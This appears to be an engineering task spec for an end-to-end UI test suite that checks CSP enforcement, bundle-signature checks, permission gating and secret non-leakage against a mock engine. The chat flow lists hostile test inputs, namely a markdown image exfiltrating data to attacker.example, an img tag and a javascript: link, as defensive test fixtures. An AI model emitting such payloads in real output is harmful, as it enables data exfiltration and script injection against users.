# X-04. E2E UI flows through relay and loader, CSP violations fail

- **Lane:** X · **Module:** `e2e/` · **Milestone:** M2
- **Depends on:** X-01, M-05, U-03, U-04, U-05, U-06, U-07, U-08, U-09, U-10, U-11, U-12, M-07
- **Status:** todo
- **Spec:** Architecture (UI delivery), Security hardening (5, 7), Transparency and verifiability (3), Interfaces (5); ADRs: [0003](../../adr/0003-ui-as-signed-bundle.md), [0004](../../adr/0004-mock-engine-and-conformance.md)

## Goal

The owner flows (home and activity, agents, create agent, edit book, chat, runs, files, triggers, integrations, security panel, secrets, audit) pass in a real browser through the relay, against the mock engine serving a signed engine-ui bundle through its loader under the strict CSP, and any CSP violation, foreign request or leaked secret fails the suite.

## Context

This is the M2 done criterion. Unit tests in engine-ui run against an in-memory client and `vite preview`; here the bundle (engine-ui plus the shared `@ptbk/ui` code it compiles in) comes from the release path (X-03 packing, M-05 verification), the CSP header comes from the mock engine, and every byte goes through the relay. The mock engine has no shortcuts the real engine would not have (ADR 0004), so the same suite later runs against the real engine (E-03).

## Scope

- Compose overlay `e2e/compose.ui.yaml`: the `init` service also packs and signs the engine-ui bundle with an ephemeral test key (M-05's test trust root), and the mock engine's loader verifies and serves it. The bundle is built from the PR's commit.
- Global fixture (`e2e/src/ui-fixtures.ts`), applied to every test in `tests/ui/`, failing the test in `afterEach` on:
  - any `securitypolicyviolation` event, console message mentioning Content Security Policy or Trusted Types, or uncaught page error;
  - any request to an origin other than the engine hostname;
  - any `dialog` event (alert, confirm, prompt).
- Engine target: tests reach the engine under test only through an `EngineTarget` port in `e2e/` (`hostname`, `session(subject)`, and optional `controls`: `reset({ scenario, seed, capabilities })`, `faults`, `pauseSimulation`, `advanceTime`, `scriptRun`, `inboundEmail`, `tamperBundle`, `lastHeartbeat`), like C-05's `ConformanceTarget`. The mock engine's adapter is the one file that knows `/__mock/*`. A flow that needs a control the target lacks skips with a reason, so the same suite runs against the real engine (E-03) and the mock engine stays replaceable.
- Sessions: the mock target gets session cookies from the mock engine's dev-only `POST /__mock/sessions` on the control listener (`{ subject: { kind: 'owner' } | { kind: 'member', role } | { kind: 'member', permissions } }`, reusing C-05's mock target) and stores them per worker. Real WebAuthn sign-in belongs to the engine gateway (engine team) and is not tested here; the only pre-auth check is that an anonymous visitor gets nothing but the sign-in page (flow 9).
- Flows (one file each):
  1. **Loader and headers:** the HTML response carries exactly `ENGINE_UI_CSP`; the served `index.html` and every asset match the signed manifest hashes; a tampered bundle (one byte changed, re-served through the control endpoint) is refused and the previous bundle keeps being served.
  2. **Agents:** seeded list visible, search, paging, filters in the URL, detail, start/stop, visibility to public with confirmation, delete with typed name.
  3. **Create agent:** wizard brief, book, knowledge upload (small text file), test chat with a streamed reply, done; the new agent appears in the list.
  4. **Edit book:** add an invalid line, diagnostics appear; fix and save; history shows the new version; diff; restore the previous version.
  5. **Chat:** send, stream renders, stop mid-stream, markdown after completion, and a scripted hostile reply (mock engine scenario) with `![x](https://attacker.example/?d=secret)`, `<img src=https://attacker.example/i>`, `[c](javascript:alert(1))`: zero requests to `attacker.example`, no dialog, no `img` element in the message.
  6. **Security panel:** engine version, both relays connected, hostnames, certificate fingerprint equal to the engine certificate the browser received, last heartbeat text equal to the payload the mock engine reports it sent, UI bundle hash equal to the SHA-256 of the archive under test.
  7. **Secrets:** create with a random canary value, replace with a second canary, revoke, delete. Neither canary appears in `page.content()`, any response body (all responses recorded), `localStorage`, `sessionStorage`, IndexedDB or console output.
  8. **Audit:** the actions from the flows above appear with filters by action and target working.
  9. **Capabilities:** a session for a member with a custom permission set lacking `agents.delete`, `secrets.read`, `secrets.manage` and `audit.read`: those actions and nav items are absent, the routes show "no access", and a forced API call returns 403; a session per role shows only what that role's permissions allow. Without a session, every UI route leads to the sign-in page (`SIGN_IN_PATH`), no engine-ui file is served and every API call returns 401.
  10. **Faults:** with mock engine fault injection, a dropped chat stream shows "interrupted"; an API 500 shows the error banner with retry; a slow tunnel shows skeletons and then data; killing relay-a mid-session leaves the app usable after a retry.
  11. **Accessibility and i18n:** `@axe-core/playwright` on each main page reports no serious or critical violations; switching to Czech changes visible text and `<html lang>`; dark mode renders without violations; at a 360 px viewport the main pages have no horizontal overflow.
  12. **Home and activity:** with the simulation paused (M-07), a scripted run plus `POST /__mock/simulation/advance` makes its start and finish appear in the live activity feed without a reload; ⌘K opens the command palette and navigates to an agent and to a run by keyboard; the owner sees the control center (counts, needs attention), a member session sees the member home.
  13. **Runs:** a scripted run progresses live in the timeline and detail (steps, tool calls), the detail shows usage, cost and a project change with changed files and the truncated diff; cancel a running run (ends `cancelled`), retry a failed one (new run linked); a member without `runs.control` sees neither action and a forced API call returns 403.
  14. **Files:** upload a knowledge file to an agent, see its scan status move from `pending` to `clean`; download it as an attachment (`Content-Disposition: attachment`); the seeded infected file offers no download; no non-raster file is ever rendered inline (no `img`, `object` or `iframe` for it).
  15. **Triggers:** create a cron schedule, advance the mock clock past its next fire, the fire appears in the history linked to the run it started; pause (no fire on the next advance) and resume; `POST /__mock/inbound-email` to an email trigger creates an `email`-source run visible in the timeline.
  16. **Integrations:** add an MCP server referencing a secret by name, run "check connection" and see the status; create the secret first with a random canary value, which never appears in `page.content()`, any recorded response body or storage.
  17. **Capability gating:** with the mock engine reset to `capabilities` without `triggers`, the Triggers nav item and the agent's Triggers tab are absent, `/triggers` says the feature is not available on this engine, and the API returns 404 `capability-not-supported`.
- CI: part of the existing `e2e` job (X-01).

## Out of scope

- Dashboard sign-up and engine linking (X-05). Spike network scenarios (X-02).
- Visual regression snapshots (flaky, low value now).

## Design notes

- Hostile, fault, simulation and capability scenarios are switched through the mock engine's dev control endpoint (M-04, M-07), never by changing the UI; time-dependent flows (12 to 15) pause the simulation and advance it explicitly, never sleep.
- Response body recording only reads text-like content types; keep the recorder in one helper reused by the secrets and chat tests.
- Run Chromium for everything (Trusted Types); add a Firefox project for flows 2, 5 and 7 so the CSP is also checked where Trusted Types are not enforced.

## Acceptance criteria

- [ ] All seventeen flows pass in the CI `e2e` job against the bundle built from the PR.
- [ ] A test build that loads anything from an external origin (e.g. a font `@import`) or injects a `<style>` element makes the suite fail, verified once and noted in the PR.
- [ ] The tampered-bundle test proves the loader refuses it.
- [ ] Secrets and hostile-output tests include positive controls showing the recorders actually see responses and requests.
- [ ] [development.md](../../development.md) explains how to run one UI flow locally against the stack.
- [ ] `bun run check` passes.
- [ ] **Status** line above set to `done (#<PR>)`.

## Risks and open points

- The mock engine must implement `POST /__mock/sessions`, the hostile-reply scenario, bundle tampering, and M-07's simulation, scripted-run, inbound-email and capability controls through the control endpoint; if M-04 or M-05 lack any of these, raise it with the M lane before working around it.
- Firefox may still lack Trusted Types; the Chromium run is the gate.
